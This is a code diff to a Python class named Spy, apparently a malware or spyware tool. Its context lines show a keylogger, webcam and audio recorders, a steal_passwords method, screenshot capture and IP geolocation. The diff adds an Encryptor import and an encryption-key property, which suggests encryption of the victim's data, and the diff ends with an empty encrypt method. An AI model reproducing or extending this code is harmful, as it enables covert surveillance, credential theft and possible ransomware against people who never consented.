@@ -6,6 +6,7 @@ import admin
 from video import VideoRecorder, AudioRecorder, get_available_cameras
 from pyautogui import screenshot
 import geocoder
+from encrypt import Encryptor
 
 
 class Spy:
@@ -15,6 +16,7 @@ class Spy:
         self.keyLogger: Optional[KeyLogger] = None
         self.video_recorder: Optional[VideoRecorder] = None
         self.audio_recorder: Optional[AudioRecorder] = None
+        self.encryptor: Optional[Encryptor] = None
 
     @staticmethod
     def steal_passwords() -> str:
@@ -84,7 +86,6 @@ class Spy:
     def get_computer() -> str:
         return os.environ['COMPUTERNAME']
 
-
     @staticmethod
     def take_screenshot(path: str) -> bool:
         """ taking a screenshot and save it in the given path.
@@ -106,4 +107,16 @@ class Spy:
     @staticmethod
     def get_location():
         return geocoder.ip('me').json
+
+    @property
+    def encryption_key(self):
+        if self.encryptor:
+            return self.encryptor.encryption_key
+        self.encryptor = Encryptor()
+        return self.encryptor.encryption_key
+
+    def encrypt(self):
+
+
+
 
